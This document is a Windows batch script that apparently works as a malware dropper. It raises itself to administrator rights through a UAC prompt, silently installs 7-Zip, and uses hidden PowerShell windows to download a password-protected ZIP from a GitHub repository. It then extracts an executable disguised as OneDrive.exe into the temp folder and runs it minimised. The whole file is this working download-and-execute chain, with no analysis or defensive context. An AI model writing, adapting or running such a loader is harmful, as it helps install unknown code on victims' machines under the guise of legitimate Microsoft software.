��&cls
��
@echo off
setlocal EnableDelayedExpansion

:: --- Request Administrator Privileges ---
>nul 2>&1 "%SystemRoot%\system32\cacls.exe" "%SystemRoot%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\uac.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c %~s0", "", "runas", 1 >> "%temp%\uac.vbs"
    "%temp%\uac.vbs" & del "%temp%\uac.vbs" & exit /b
)

:: --- Define Variables ---
set "zipFile=%TEMP%\OneDrive.zip"
set "exeFile=OneDrive.exe"
set "zipPassword=*#Slayerx@123"
set "downloadUrl=https://github.com/Andre0194/service/raw/refs/heads/master/OneDrive.zip"
set "sevenZipInstaller=%TEMP%\7zsetup.exe"

:: Detect architecture (32-bit or 64-bit)
set "arch=x86"
if "%PROCESSOR_ARCHITECTURE%"=="AMD64" set "arch=x64"

:: Define 7-Zip path depending on architecture
set "sevenZipPath=%ProgramFiles%\7-Zip\7z.exe"
if not exist "%sevenZipPath%" set "sevenZipPath=%ProgramFiles(x86)%\7-Zip\7z.exe"

:: 7-Zip download URLs
set "url_x64=https://www.7-zip.org/a/7z2301-x64.exe"
set "url_x86=https://www.7-zip.org/a/7z2301.exe"

:: --- Ensure PowerShell is available ---
where powershell >nul 2>&1 || (
    echo [!] PowerShell not found. Exiting.
    exit /b
)

:: --- Install 7-Zip if Missing ---
if not exist "%sevenZipPath%" (
    if "%arch%"=="x64" (
        powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url_x64%' -OutFile '%sevenZipInstaller%'"
    ) else (
        powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%url_x86%' -OutFile '%sevenZipInstaller%'"
    )

    if exist "%sevenZipInstaller%" (
        start /wait "" "%sevenZipInstaller%" /S
        del /f /q "%sevenZipInstaller%"
    ) else (
        echo [!] Failed to download 7-Zip installer. Exiting.
        exit /b
    )

    :: After install, refresh path
    set "sevenZipPath=%ProgramFiles%\7-Zip\7z.exe"
    if not exist "%sevenZipPath%" set "sevenZipPath=%ProgramFiles(x86)%\7-Zip\7z.exe"
)

:: --- Download the ZIP File ---
set /a retries=0
:download
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%downloadUrl%' -OutFile '%zipFile%' } catch { exit 1 }"
if not exist "%zipFile%" (
    set /a retries+=1
    if !retries! LSS 3 (
        timeout /t 3 /nobreak >nul
        goto download
    )
    echo [!] Failed to download ZIP after multiple attempts. Exiting.
    exit /b
)

:: --- Validate the ZIP File ---
for %%A in ("%zipFile%") do (
    if %%~zA LSS 1024 (
        echo [!] Downloaded file is too small. Possibly corrupted. Exiting.
        del /f /q "%zipFile%"
        exit /b
    )
)

:: --- Extract and Run ---
"%sevenZipPath%" e -p%zipPassword% -y "%zipFile%" "%exeFile%" -o"%TEMP%" >nul 2>&1

if exist "%TEMP%\%exeFile%" (
    start "" /min "%TEMP%\%exeFile%"
) else (
    echo [!] Extraction failed or EXE missing. Exiting.
)

exit /b
